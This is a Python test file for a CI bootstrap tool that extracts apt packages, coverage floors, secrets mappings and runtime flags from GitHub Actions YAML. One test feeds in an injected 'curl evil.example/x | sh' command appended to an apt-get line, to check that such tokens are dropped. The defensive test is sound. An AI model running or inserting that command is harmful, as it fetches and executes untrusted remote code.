"""Tests for the shared bootstrap.extract primitives.

This is a leaf module both bootstrap/command.py (the writer) and
suite/checks/bootstrap_drift.py (the C002 checker) import at module level
without creating a cycle -- see bootstrap/extract.py's module docstring.
"""

from __future__ import annotations

import pytest
from conformance.bootstrap import extract as extract_mod
from conformance.bootstrap.extract import (
    EXIT_ZERO_RE,
    declared_keys,
    extract_apt_packages,
    extract_declared_unit_coverage_fail_under,
    extract_field,
    extract_force_external_runtime,
    extract_renovate_automerge,
    extract_secrets_block,
    extract_tests_yaml_params,
    extract_use_ghcr_base,
    format_dropped_declarations,
    resolve_renovate_fallback_exit_zero,
    reusable_job_with_block,
    structural_lines,
    unpreservable_secrets_form,
    unpreserved_declarations,
    unpreserved_tests_yaml_declarations,
)
from conformance.bootstrap.render import render


def test_extract_field_bare_value() -> None:
    assert extract_field("package_name: app\n", "package_name") == "app"


def test_extract_field_quoted_value() -> None:
    assert extract_field('package_name: "app"\n', "package_name") == "app"


def test_extract_field_indented() -> None:
    assert (
        extract_field(
            "  unit_tests_workflow_file: tests.yaml\n", "unit_tests_workflow_file"
        )
        == "tests.yaml"
    )


def test_extract_field_absent_returns_empty() -> None:
    assert extract_field("some: other\n", "package_name") == ""


def test_extract_field_matches_first_occurrence_only() -> None:
    text = "package_name: first\npackage_name: second\n"
    assert extract_field(text, "package_name") == "first"


def test_extract_apt_packages_from_rendered_checks_yml() -> None:
    """The round trip bootstrap's re-run autodetection and C002 both depend on:
    what render() wrote must read back as the exact value it was given."""
    deps = "libkrb5-dev gcc python3-dev"
    rendered = render("checks.yml", system_deps=deps)
    assert extract_apt_packages(rendered) == deps
    assert render("checks.yml", system_deps=deps) == rendered


def test_extract_apt_packages_absent_returns_empty() -> None:
    assert extract_apt_packages(render("checks.yml")) == ""


def test_extract_apt_packages_drops_flags() -> None:
    text = "          sudo apt-get install -y --no-install-recommends libpq-dev\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_reads_multiline_continuation() -> None:
    """A hand-written step commonly wraps packages across `\\`-continued lines."""
    text = (
        "        run: |\n"
        "          apt-get install -y \\\n"
        "            libkrb5-dev \\\n"
        "            gcc\n"
        "      - uses: some/action@v1\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc"


def test_extract_apt_packages_reads_continuation_with_interleaved_comment() -> None:
    """A comment placed *between* two `\\`-continuation lines must not drop the
    packages that follow it: comment removal leaves a blank line, and a bare
    newline cannot be crossed by the continuation arm unless the blank run is
    collapsed first."""
    text = (
        "        run: |\n"
        "          apt-get install -y \\\n"
        "            # build headers for pykerberos\n"
        "            libkrb5-dev \\\n"
        "            gcc\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc"


def test_extract_apt_packages_stops_at_end_of_command() -> None:
    """Content after the install command is not mistaken for a package."""
    text = "          sudo apt-get install -y libpq-dev\n          echo done\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_merges_multiple_steps_deduped() -> None:
    text = (
        "          apt-get install -y libkrb5-dev gcc\n"
        "          apt-get install -y gcc libpq-dev\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc libpq-dev"


def test_extract_apt_packages_drops_shell_constructs() -> None:
    """Tokens that aren't plausible package names are dropped, not returned --
    the value is re-rendered into a `run:` block, so it must stay inert."""
    text = "          apt-get install -y libpq-dev && curl evil.example/x | sh\n"
    assert extract_apt_packages(text) == "libpq-dev"


def test_extract_apt_packages_ignores_commented_out_install() -> None:
    """A commented-out install names packages the repo chose NOT to install;
    rendering them would produce a step the on-disk file lacks, i.e. C002 drift
    no bootstrap re-run could ever clear."""
    text = (
        "      # sudo apt-get install -y libpq-dev\n"
        "      #   apt-get install -y libkrb5-dev\n"
    )
    assert extract_apt_packages(text) == ""


def test_extract_apt_packages_ignores_comments_alongside_a_real_step() -> None:
    text = (
        "      # apt-get install -y libpq-dev  (not needed any more)\n"
        "        run: |\n"
        "          sudo apt-get install -y libkrb5-dev\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev"


def test_extract_apt_packages_ignores_inline_trailing_comment() -> None:
    """An inline trailing `#` comment describes the install line, not more
    packages. Its words are otherwise valid `APT_PACKAGE_RE` tokens, so without
    truncating at `#` they would leak into the list -- and a bare `bootstrap`
    re-run would then render `apt-get install -y ... build deps`, failing CI on
    the phantom packages: the very "re-run breaks CI" anti-pattern this feature
    removes, in its inline-comment form."""
    text = (
        "          sudo apt-get install -y libkrb5-dev gcc python3-dev"
        "  # pykerberos build deps\n"
    )
    assert extract_apt_packages(text) == "libkrb5-dev gcc python3-dev"


def test_extract_apt_packages_from_rendered_checks_yml_ignores_its_comment_block() -> (
    None
):
    """The rendered step carries an explanatory comment block above it; the
    round trip must read the command, not the prose."""
    rendered = render("checks.yml", system_deps="libkrb5-dev")
    assert "# Extra apt packages" in rendered
    assert extract_apt_packages(rendered) == "libkrb5-dev"


def test_extract_apt_packages_keeps_version_pin() -> None:
    text = "          apt-get install -y libkrb5-dev=1.20.1-2 gcc/bookworm\n"
    assert extract_apt_packages(text) == "libkrb5-dev=1.20.1-2 gcc/bookworm"


def test_extract_apt_packages_round_trips_version_pin_through_render() -> None:
    """`APT_PACKAGE_RE` deliberately allows `=` and `/` for version pins and
    release qualifiers; lock the full render->extract round trip for those forms
    so the extra characters stay in step with the rendered `checks.yml`."""
    deps = "libkrb5-dev=1.20.1-2 gcc/bookworm"
    assert extract_apt_packages(render("checks.yml", system_deps=deps)) == deps


def test_extract_renovate_automerge_soft_mode() -> None:
    text = '{"lockFileMaintenance": {"automerge": false}}'
    assert extract_renovate_automerge(text) == "false"


def test_extract_renovate_automerge_hard_mode() -> None:
    text = "{}"
    assert extract_renovate_automerge(text) == "true"


def test_extract_renovate_automerge_unparseable_defaults_hard() -> None:
    assert extract_renovate_automerge("not json") == "true"


def test_exit_zero_re_matches_rendered_expression() -> None:
    line = "exit-zero: ${{ github.event.inputs.exit_zero || true }}"
    m = EXIT_ZERO_RE.search(line)
    assert m is not None
    assert m.group(1) == "true"


def test_exit_zero_re_does_not_match_plain_field() -> None:
    assert EXIT_ZERO_RE.search("exit-zero: true\n") is None


def test_resolve_renovate_fallback_exit_zero_soft_mode() -> None:
    text = '{"lockFileMaintenance": {"automerge": false}}'
    assert resolve_renovate_fallback_exit_zero(text) == "true"


def test_resolve_renovate_fallback_exit_zero_hard_mode() -> None:
    assert resolve_renovate_fallback_exit_zero("{}") == "false"


def test_resolve_renovate_fallback_exit_zero_unparseable_defaults_hard() -> None:
    assert resolve_renovate_fallback_exit_zero("not json") == "false"


# ---------------------------------------------------------------------------
# tests.yaml's unit-coverage-fail-under (an app raising its own coverage floor)
# ---------------------------------------------------------------------------


def _raise_floor(monkeypatch: pytest.MonkeyPatch, floor: int) -> None:
    """Move ``SDK_UNIT_COVERAGE_FLOOR`` for the duration of one test.

    The floor is 0 today, so nothing can be *below* it and the reject branch
    would be untestable at the real value — and a test that only holds while
    the constant is 0 would silently stop covering the branch the day the SDK
    raises its floor. Patched on the module (both readers resolve the global at
    call time) so it moves for the extractor and the checker alike.
    """
    monkeypatch.setattr(extract_mod, "SDK_UNIT_COVERAGE_FLOOR", floor)


def test_extract_tests_yaml_params_keeps_coverage_floor_above_sdk() -> None:
    params = extract_tests_yaml_params(
        render("tests.yaml", app_name="widget", unit_coverage_fail_under="40")
    )
    assert params["unit_coverage_fail_under"] == "40"


def test_extract_tests_yaml_params_keeps_coverage_floor_equal_to_sdk(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A value equal to the floor weakens nothing, so it is preserved.

    Deleting a redundant-but-honest declaration would be churn, not
    remediation — and it would make C002 flag a file whose only sin is being
    explicit about the floor it already inherits.
    """
    _raise_floor(monkeypatch, 40)
    params = extract_tests_yaml_params(
        render("tests.yaml", app_name="widget", unit_coverage_fail_under="40")
    )
    assert params["unit_coverage_fail_under"] == "40"


def test_extract_tests_yaml_params_drops_coverage_floor_below_sdk(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Below the SDK floor is not a preserved choice — apps may only raise it.

    Dropping it is what keeps the finding standing (the canonical then has no
    line) and what makes ``--resync`` remove the line so the app inherits the
    SDK floor again.
    """
    _raise_floor(monkeypatch, 40)
    params = extract_tests_yaml_params(
        render("tests.yaml", app_name="widget", unit_coverage_fail_under="20")
    )
    assert "unit_coverage_fail_under" not in params


def test_extract_tests_yaml_params_reads_bare_coverage_value() -> None:
    """Hand-written without quotes is the same declaration."""
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: 55\n'
    assert extract_tests_yaml_params(text)["unit_coverage_fail_under"] == "55"


def test_extract_tests_yaml_params_ignores_commented_coverage_value() -> None:
    """A commented-out line names a floor the repo chose NOT to apply.

    Extracting it would render a line the on-disk file doesn't have, leaving
    C002 drift no re-run could clear — the same trap the services-script and
    apt-package extractors are anchored against.
    """
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      # unit-coverage-fail-under: "55"\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_tests_yaml_params_ignores_non_numeric_coverage_value() -> None:
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: "high"\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_tests_yaml_params_ignores_a_left_quote_only_coverage_value() -> None:
    """Half-quoted is malformed YAML, not a bare declaration in disguise."""
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: "55\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_tests_yaml_params_ignores_a_right_quote_only_coverage_value() -> None:
    text = 'jobs:\n  tests:\n    with:\n      app-name: "w"\n      unit-coverage-fail-under: 55"\n'
    assert "unit_coverage_fail_under" not in extract_tests_yaml_params(text)


def test_extract_declared_coverage_reports_a_sub_floor_value(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The unfiltered reader sees what the filtered one refuses to preserve.

    This is the distinction the C002 message needs: "declares nothing" and
    "declares a floor we dropped" produce the same params dict, and only the
    second should be explained in terms of the coverage line.
    """
    _raise_floor(monkeypatch, 40)
    text = 'jobs:\n  tests:\n    with:\n      unit-coverage-fail-under: "20"\n'
    assert extract_declared_unit_coverage_fail_under(text) == "20"


def test_extract_declared_coverage_empty_when_absent() -> None:
    assert extract_declared_unit_coverage_fail_under(render("tests.yaml")) == ""


# ---------------------------------------------------------------------------
# build-and-publish.yaml's use_ghcr_base (an app self-selecting the redirect)
# ---------------------------------------------------------------------------


def test_extract_use_ghcr_base_round_trips_through_render() -> None:
    """The write side and the read side must agree, or the opt-in is deleted by
    the next bare re-run of an always-overwrite shim."""
    rendered = render("build-and-publish.yaml", use_ghcr_base="true")
    assert extract_use_ghcr_base(rendered) == "true"


def test_extract_use_ghcr_base_empty_when_absent() -> None:
    assert extract_use_ghcr_base(render("build-and-publish.yaml")) == ""


def test_extract_use_ghcr_base_empty_for_explicit_false() -> None:
    """``false`` is a second spelling of the default, so it renders no line.

    Returning ``"false"`` here would make the checker render an explicit
    ``use_ghcr_base: false`` and then report every repo that spells the default
    the other way (i.e. by saying nothing) as drifted.
    """
    text = "jobs:\n  build:\n    with:\n      use_ghcr_base: false\n"
    assert extract_use_ghcr_base(text) == ""


def test_extract_use_ghcr_base_ignores_commented_opt_in() -> None:
    text = "jobs:\n  build:\n    with:\n      # use_ghcr_base: true\n"
    assert extract_use_ghcr_base(text) == ""


# ---------------------------------------------------------------------------
# FND-604: the two tests.yaml values --resync used to delete, and the
# generalised guard for whatever the next one turns out to be.
# ---------------------------------------------------------------------------


# The caller shape the wave-D repos hand-wrote: an explicit `secrets:` mapping
# composing E2E_SOURCE_ENV_JSON out of per-connector credential names, under the
# comment recording why `inherit` was dropped. Synthetic names, real shape —
# `inherit` can neither compose nor rename, so it cannot populate this at all.
_EXPLICIT_SECRETS = """\
    # Mapped explicitly instead of `secrets: inherit`: inherit cannot compose.
    secrets:
      SDR_TEST_TENANT: ${{ secrets.SDR_TEST_TENANT }}
      E2E_SOURCE_ENV_JSON: |
        {"ATLAN_APP_MODULE": "app.widget:WidgetApp",
         "E2E_WIDGET_HOST": ${{ toJSON(secrets.E2E_WIDGET_HOST) }}}"""


def test_extract_force_external_runtime_round_trips_through_render() -> None:
    """The write side and the read side must agree, or --resync deletes the line
    and the connector's main.py boots into DaprNotDetectedError (FND-65)."""
    rendered = render("tests.yaml", app_name="widget", force_external_runtime="true")
    assert extract_force_external_runtime(rendered) == "true"


_REUSABLE_USES = (
    "    uses: atlanhq/application-sdk/.github/workflows/tests-reusable.yaml@main"
)


@pytest.mark.parametrize(
    "body",
    [
        '      force-external-runtime: true\n      app-name: "widget"',
        '      app-name: "widget"\n      force-external-runtime: "true"',
    ],
    ids=["bare-first", "quoted-last"],
)
def test_extract_force_external_runtime_reads_both_spellings(body: str) -> None:
    """The fleet hand-wrote it bare *and* quoted, at two different positions.

    Both fixtures carry the reusable's ``uses:`` line because the read is scoped
    to that job's ``with:`` block — see
    ``test_extract_force_external_runtime_ignores_another_jobs_input``.
    """
    text = f"jobs:\n  tests:\n{_REUSABLE_USES}\n    with:\n{body}\n"
    assert extract_force_external_runtime(text) == "true"


def test_extract_force_external_runtime_ignores_another_jobs_input() -> None:
    """Scoped to the reusable job's own ``with:``.

    A repo is free to carry other jobs, and a key that is also a reusable input
    may legitimately appear under one. Reading the first match file-wide
    attributed it to the reusable call and re-rendered it as one of that job's
    inputs — forcing the external runtime on a repo that never asked for it, so
    the connector's app server started expecting an external daprd that CI never
    brought up.
    """
    text = (
        f'jobs:\n  tests:\n{_REUSABLE_USES}\n    with:\n      app-name: "widget"\n'
        "  other-job:\n    runs-on: ubuntu-latest\n    with:\n"
        "      force-external-runtime: true\n"
    )
    assert extract_force_external_runtime(text) == ""


def test_another_jobs_input_still_stops_the_resync() -> None:
    """The scoping narrows what is *hoisted*, never what is preserved.

    A declaration the scoped read cannot see is not silently deleted either: it
    reaches the generalised guard as a key the re-render would lose, and the
    resync refuses. Losing a real declaration and hoisting a stray one are both
    failures; this pins that closing the second did not open the first.
    """
    canonical = render("tests.yaml", app_name="widget")
    stray = canonical.replace(
        "    secrets: inherit",
        "    secrets: inherit\n  other-job:\n    runs-on: ubuntu-latest\n"
        "    with:\n      force-external-runtime: true",
    )
    assert extract_force_external_runtime(stray) == ""
    assert "force-external-runtime" in unpreserved_tests_yaml_declarations(
        stray, canonical
    )


def test_reusable_uses_line_inside_a_run_scalar_is_not_the_reusable_call() -> None:
    """A block scalar's body is text, not structure.

    The sharpest form of the hoisting bug, because it evades the guard as well as
    the read: a job whose ``run: |`` scalar quotes the reusable's ``uses:`` line
    binds first (it is earlier in the file), so the scoped read returns the
    *scalar's* text and reads ``force-external-runtime: true`` out of it — while
    ``declared_keys`` skips scalar bodies by design, so the key-set guard never
    sees the key it would have refused over. The re-render then silently ADDS the
    input to ``jobs.tests.with``, forcing the external runtime on a repo that
    never asked (the FND-65 boot-failure class).

    The quoted ``uses:`` and ``with:`` sit at the *same* indent inside the
    scalar, which is what makes that text parse as a job whose ``with:`` is a
    sibling of its ``uses:``. Staggered indents happen not to reproduce, so a
    fixture that staggered them would have passed against the bug.
    """
    text = (
        "jobs:\n"
        "  docs:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: |\n"
        "        cat <<'EOF'\n"
        f"          {_REUSABLE_USES.strip()}\n"
        "          with:\n"
        "            force-external-runtime: true\n"
        "        EOF\n"
        "  tests:\n"
        f"{_REUSABLE_USES}\n"
        '    with:\n      app-name: "widget"\n'
    )
    assert reusable_job_with_block(text) == '      app-name: "widget"'
    assert extract_force_external_runtime(text) == ""


def test_secrets_mapping_inside_a_run_scalar_is_not_spliced() -> None:
    """The same class on the writing side, and the sharper half.

    A ``secrets:`` mapping quoted inside a ``run: |`` step was spliced into the
    rendered ``jobs.tests`` verbatim — fabricating credential wiring out of a
    documentation example, on a job whose real declaration was ``inherit``.
    """
    text = (
        "jobs:\n"
        "  docs:\n"
        "    steps:\n"
        "      - run: |\n"
        "        secrets:\n"
        "          A: notreal\n"
        "  tests:\n"
        f"{_REUSABLE_USES}\n"
        "    secrets: inherit\n"
    )
    assert extract_secrets_block(text) == ""


def test_structural_lines_blanks_scalar_bodies_and_comments_in_place() -> None:
    """Line count is preserved, so an index maps back to the original line.

    ``extract_secrets_block`` splices original bytes at indices this view
    decides; a compacted list would shift every one of them.
    """
    text = "a: 1\n# comment\nb: |\n  not: structure\n\nc: 2\n"
    assert structural_lines(text) == ["a: 1", "", "b: |", "", "", "c: 2"]


def test_extract_secrets_block_ignores_another_jobs_mapping() -> None:
    """Scoped like the input read, and for a sharper reason.

    Splicing a mapping found under a different job into the rendered
    ``jobs.tests`` would fabricate credential wiring on a job that never
    declared it — worse than dropping it, and the guard already refuses any file
    carrying an extra job.
    """
    text = (
        f'jobs:\n  tests:\n{_REUSABLE_USES}\n    with:\n      app-name: "widget"\n'
        "  e2e:\n    uses: ./other.yaml\n    secrets:\n"
        "      A: ${{ secrets.A }}\n"
    )
    assert extract_secrets_block(text) == ""


def test_unpreservable_secrets_form_ignores_another_jobs_inline_mapping() -> None:
    """The refusal is scoped to the same boundary the splice reads within.

    A file-wide scan appended ``secrets`` to the refusal list for an inline
    mapping under an unrelated job, although the re-render only rewrites
    ``jobs.tests``. Latent while any extra job is refused on its own keys — but
    it would block a resync outright the day the canonical grows a sibling job.
    """
    text = (
        f"jobs:\n  tests:\n{_REUSABLE_USES}\n    secrets: inherit\n"
        "  e2e:\n    uses: ./other.yaml\n"
        "    secrets: {A: ${{ secrets.A }}}\n"
    )
    assert unpreservable_secrets_form(text) == ""


def test_extract_force_external_runtime_reads_a_with_block_above_uses() -> None:
    """Key order inside the job is the author's choice, not a signal."""
    text = (
        f"jobs:\n  tests:\n    with:\n      force-external-runtime: true\n"
        f"{_REUSABLE_USES}\n"
    )
    assert extract_force_external_runtime(text) == "true"


def test_extract_force_external_runtime_empty_when_absent() -> None:
    assert extract_force_external_runtime(render("tests.yaml")) == ""


def test_extract_force_external_runtime_empty_for_explicit_false() -> None:
    """Same reason as ``use_ghcr_base``: an explicit ``false`` is a second
    spelling of the input default and would read as drift fleet-wide."""
    assert extract_force_external_runtime("      force-external-runtime: false\n") == ""


def test_extract_force_external_runtime_ignores_a_commented_line() -> None:
    text = "      # force-external-runtime: true\n"
    assert extract_force_external_runtime(text) == ""


def test_extract_secrets_block_captures_the_mapping_and_its_comments() -> None:
    """Spliced verbatim: the mapping's contents are per-connector, and the
    comments above it are the only record of why ``inherit`` was dropped."""
    text = render("tests.yaml", app_name="widget").replace(
        "    secrets: inherit", _EXPLICIT_SECRETS
    )
    assert extract_secrets_block(text) == _EXPLICIT_SECRETS


def test_extract_secrets_block_round_trips_through_render() -> None:
    """The property --resync depends on: rendering an extracted block reads back
    as the same block, so a resynced file resyncs again unchanged."""
    once = render("tests.yaml", app_name="widget", secrets_block=_EXPLICIT_SECRETS)
    assert extract_secrets_block(once) == _EXPLICIT_SECRETS
    assert render("tests.yaml", **extract_tests_yaml_params(once)) == once


def test_extract_secrets_block_empty_for_inherit() -> None:
    """``inherit`` is the canonical default, so it must render from the template
    rather than from a captured block."""
    assert extract_secrets_block(render("tests.yaml")) == ""


def test_extract_secrets_block_empty_for_a_childless_secrets_line() -> None:
    """A bare ``secrets:`` with nothing under it is YAML null, not a mapping.

    Capturing it would replace the working ``inherit`` default with a line that
    passes no secrets at all — the very failure this extractor exists to prevent.
    """
    text = f"jobs:\n  tests:\n{_REUSABLE_USES}\n    secrets:\n\nother: 1\n"
    assert extract_secrets_block(text) == ""


def test_extract_secrets_block_stops_at_the_next_sibling_key() -> None:
    text = (
        f"jobs:\n  tests:\n{_REUSABLE_USES}\n"
        "    secrets:\n      A: ${{ secrets.A }}\n\n"
        "  other-job:\n    runs-on: ubuntu-latest\n"
    )
    assert extract_secrets_block(text) == "    secrets:\n      A: ${{ secrets.A }}"


def test_extract_secrets_block_stops_at_a_same_indent_comment() -> None:
    """A comment below the block at ``secrets:``'s own indent belongs to what
    follows, not to the mapping.

    The child walk bounds itself on the structural view, where a comment line
    is blank — and a blank line never outdents, so the walk used to pass
    through a same-indent comment and splice the next section's heading into
    the rendered ``jobs.tests`` secrets block. A comment indented *deeper* than
    ``secrets:`` is still part of the block (it documents a child key), so only
    the same/shallower-indent case is a boundary.
    """
    text = (
        f"jobs:\n  tests:\n{_REUSABLE_USES}\n"
        "    secrets:\n      A: ${{ secrets.A }}\n"
        "    # comment for the next job\n"
        "  next-job:\n    runs-on: ubuntu-latest\n"
    )
    assert extract_secrets_block(text) == "    secrets:\n      A: ${{ secrets.A }}"


def test_extract_secrets_block_keeps_a_deeper_indented_comment() -> None:
    """A comment inside the mapping's indentation is part of the block."""
    text = (
        f"jobs:\n  tests:\n{_REUSABLE_USES}\n"
        "    secrets:\n      # why A is enough\n      A: ${{ secrets.A }}\n"
        "  next-job:\n    runs-on: ubuntu-latest\n"
    )
    assert extract_secrets_block(text) == (
        "    secrets:\n      # why A is enough\n      A: ${{ secrets.A }}"
    )


def test_extract_tests_yaml_params_carries_both_fnd604_values() -> None:
    text = render(
        "tests.yaml",
        app_name="widget",
        force_external_runtime="true",
        secrets_block=_EXPLICIT_SECRETS,
    )
    params = extract_tests_yaml_params(text)
    assert params["force_external_runtime"] == "true"
    assert params["secrets_block"] == _EXPLICIT_SECRETS


@pytest.mark.parametrize(
    "line",
    [
        '      services-script: ".github/test/setup-services.sh"',
        "      services-script: .github/test/setup-services.sh",
        "      services-script: '.github/test/setup-services.sh'",
    ],
    ids=["double", "bare", "single"],
)
def test_extract_services_script_reads_quoted_and_bare(line: str) -> None:
    """Bare is not hypothetical: the only two repos that run a services script
    hand-wrote it unquoted, and a quoted-only read-back deleted their active line
    on every --resync — FND-604's class again, caught by the guard added for it.

    The fixture carries the ``uses:`` line because this is an input of the
    reusable job and is read from that job's own ``with:`` block, like
    ``force-external-runtime`` and the app-identity pair. A file with no reusable
    job declares no inputs for it, and the round-trip guard refuses that file on
    its own jobs' keys rather than losing anything here.
    """
    text = (
        "jobs:\n"
        "  tests:\n"
        "    uses: atlanhq/application-sdk"
        "/.github/workflows/tests-reusable.yaml@main\n"
        "    with:\n"
        f"{line}\n"
    )
    params = extract_tests_yaml_params(text)
    assert params["services_script"] == ".github/test/setup-services.sh"


def test_extract_services_script_ignores_the_commented_placeholder() -> None:
    """The canonical renders the line commented out when no script is set.

    Reading it back would activate a hook the repo deliberately left off.
    """
    assert "services_script" not in extract_tests_yaml_params(render("tests.yaml"))


def test_declared_keys_skips_comments_and_block_scalar_bodies() -> None:
    """A hand-written ``run:`` step's shell is content, not structure.

    Mining it for keys would make the guard refuse over lines that are not
    declarations at all.
    """
    text = (
        "jobs:\n"
        "  gate:\n"
        "    # commented-out: value\n"
        "    run: |\n"
        "      not-a-key: still-not\n"
        "      echo done\n"
        "    shell: bash\n"
    )
    assert declared_keys(text) == ["jobs", "gate", "run", "shell"]


def test_declared_keys_counts_a_sequence_item_mapping() -> None:
    assert declared_keys("steps:\n  - uses: actions/checkout\n") == ["steps", "uses"]


def test_unpreserved_declarations_empty_for_a_canonical_round_trip() -> None:
    """The premise of the guard: a file bootstrap itself wrote must never be
    refused, or --resync stops working for every repo at once."""
    canonical = render("tests.yaml", app_name="widget")
    assert unpreserved_declarations(canonical, canonical) == []


def test_unpreserved_declarations_reports_an_extra_job() -> None:
    """The real remaining case once both FND-604 values are carried forward: a
    repo keeping an extra job whose name its branch protection still requires."""
    canonical = render("tests.yaml", app_name="widget")
    extended = canonical + (
        "\n  tests-passed:\n"
        "    needs: [tests]\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: echo ok\n"
    )
    dropped = unpreserved_declarations(extended, canonical)
    assert "tests-passed" in dropped
    assert "needs" in dropped


def test_unpreserved_declarations_treats_a_moved_line_as_preserved() -> None:
    """The repair trap FND-604 names.

    The audit script that first caught this reported a merely *moved* line as a
    removal, and reapplying on that reading duplicates a YAML key so only the
    last copy survives. A key present on both sides is preserved, wherever it
    sits — which is why this compares key sets rather than lines.
    """
    canonical = render("tests.yaml", app_name="widget", force_external_runtime="true")
    moved = canonical.replace("      force-external-runtime: true\n", "").replace(
        '      app-image-name: "atlan-widget-app"\n',
        '      app-image-name: "atlan-widget-app"\n'
        "      force-external-runtime: true\n",
    )
    assert moved != canonical, "fixture did not actually move the line"
    assert unpreserved_declarations(moved, canonical) == []


def test_unpreserved_tests_yaml_declarations_allows_the_sub_floor_drop(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A sub-floor coverage line is the one drop that is policy, not loss.

    Letting it reach the generalised guard would invert the coverage rule: the
    resync would refuse, and the sub-floor line would survive every run.
    """
    _raise_floor(monkeypatch, 40)
    canonical = render("tests.yaml", app_name="widget")
    sub_floor = canonical.replace(
        '      app-name: "widget"',
        '      unit-coverage-fail-under: "20"\n      app-name: "widget"',
    )
    assert unpreserved_declarations(sub_floor, canonical) == [
        "unit-coverage-fail-under"
    ]
    assert unpreserved_tests_yaml_declarations(sub_floor, canonical) == []


def test_unpreserved_tests_yaml_declarations_still_stops_an_unparseable_floor() -> None:
    """An unreadable spelling is not a decision anyone made, so it still counts.

    Carving out the key *name* rather than the recognised sub-floor *value*
    would let a typo be deleted silently — the same class of loss as FND-604.
    """
    canonical = render("tests.yaml", app_name="widget")
    bad = canonical.replace(
        '      app-name: "widget"',
        '      unit-coverage-fail-under: ninety\n      app-name: "widget"',
    )
    assert unpreserved_tests_yaml_declarations(bad, canonical) == [
        "unit-coverage-fail-under"
    ]


@pytest.mark.parametrize(
    "inline",
    [
        '{SDR_TEST_TENANT: "${{ secrets.SDR_TEST_TENANT }}"}',
        "*shared-secrets",
        "&repo-secrets {A: b}",
    ],
    ids=["flow-mapping", "alias", "anchor"],
)
def test_unpreserved_tests_yaml_declarations_stops_an_inline_secrets_mapping(
    inline: str,
) -> None:
    """The one shape invisible to *both* halves of the FND-604 fix.

    An inline ``secrets:`` is not block form, so ``extract_secrets_block``
    returns ``""`` and the re-render emits ``secrets: inherit`` — while
    ``secrets`` is a key on both sides of the key-set comparison, so the
    generalised guard reads the shared name as proof of preservation. Together
    that reproduced the original defect through a different spelling: the
    explicit mapping replaced by an ``inherit`` that can neither compose nor
    rename, and the integration and e2e legs left with no source credentials.
    """
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace("    secrets: inherit", f"    secrets: {inline}")
    assert extract_secrets_block(text) == ""
    assert unpreservable_secrets_form(text) == inline
    assert unpreserved_tests_yaml_declarations(text, canonical) == ["secrets"]


@pytest.mark.parametrize(
    "line",
    ["    secrets: inherit", "    secrets: inherit  # composes nothing, by design"],
    ids=["inherit", "inherit-with-comment"],
)
def test_unpreservable_secrets_form_passes_the_canonical_default(line: str) -> None:
    """``inherit`` is what the template emits, so it must not trip the refusal."""
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace("    secrets: inherit", line)
    assert unpreservable_secrets_form(text) == ""
    assert unpreserved_tests_yaml_declarations(text, canonical) == []


def test_unpreservable_secrets_form_passes_a_block_mapping() -> None:
    """Block form is spliced verbatim, so it is preserved, not refused.

    The refusal is the fallback for shapes the splice cannot carry; firing it on
    one it *can* would block every repo the FND-604 fix was written to serve.
    """
    canonical = render("tests.yaml", app_name="widget")
    text = canonical.replace("    secrets: inherit", _EXPLICIT_SECRETS)
    assert unpreservable_secrets_form(text) == ""
    assert extract_secrets_block(text) == _EXPLICIT_SECRETS
    # Compared against the re-render --resync would actually write (which carries
    # the block forward), not against the bare canonical: the mapping's own
    # credential names are keys too, and they survive because the block does.
    rerendered = render("tests.yaml", **extract_tests_yaml_params(text))
    assert unpreserved_tests_yaml_declarations(text, rerendered) == []


def test_format_dropped_declarations_bounds_the_list_but_not_the_count() -> None:
    """A refusal nobody reads to the end is the silent failure it replaced."""
    assert format_dropped_declarations(["a", "b"]) == "`a`, `b`"
    formatted = format_dropped_declarations([f"k{i}" for i in range(9)])
    assert formatted.endswith("(+3 more)")
    assert "`k5`" in formatted
    assert "`k6`" not in formatted


# --- Quoted-key coverage (the quoted-key class) ------------------------------


@pytest.mark.parametrize("quote", ['"', "'"], ids=["double", "single"])
def test_quoted_block_secrets_round_trips_through_render(quote: str) -> None:
    """A quoted ``"secrets":`` block is the same declaration as a bare one.

    The guard and both readers used to know the bare spelling only, so a quoted
    block was refused over its *child* key while the block itself was dropped —
    naming the wrong declaration and losing the mapping at once. The quoted
    spelling must splice verbatim and survive the key-set guard, exactly as the
    bare one does.
    """
    canonical = render("tests.yaml", app_name="widget")
    block = _EXPLICIT_SECRETS.replace("secrets:", f"{quote}secrets{quote}:", 1)
    text = canonical.replace("    secrets: inherit", block)
    assert extract_secrets_block(text) == block
    assert unpreservable_secrets_form(text) == ""
    rerendered = render("tests.yaml", **extract_tests_yaml_params(text))
    assert unpreserved_tests_yaml_declarations(text, rerendered) == []


@pytest.mark.parametrize("quote", ['"', "'"], ids=["double", "single"])
def test_quoted_inline_secrets_still_stops_the_resync(quote: str) -> None:
    """A quoted inline mapping is unpreservable, so it must refuse — not vanish.

    Inline form is invisible to the block splice, so the re-render emits
    ``secrets: inherit``. The whole point of the guard is that this downgrade
    refuses; a quoted spelling the readers could not see would have sailed
    through the key-set comparison and been silently replaced.
    """
    canonical = render("tests.yaml", app_name="widget")
    inline = f'    {quote}secrets{quote}: {{SDR_TEST_TENANT: "${{{{ secrets.SDR_TEST_TENANT }}}}"}}'
    text = canonical.replace("    secrets: inherit", inline)
    assert extract_secrets_block(text) == ""
    assert unpreservable_secrets_form(text) != ""
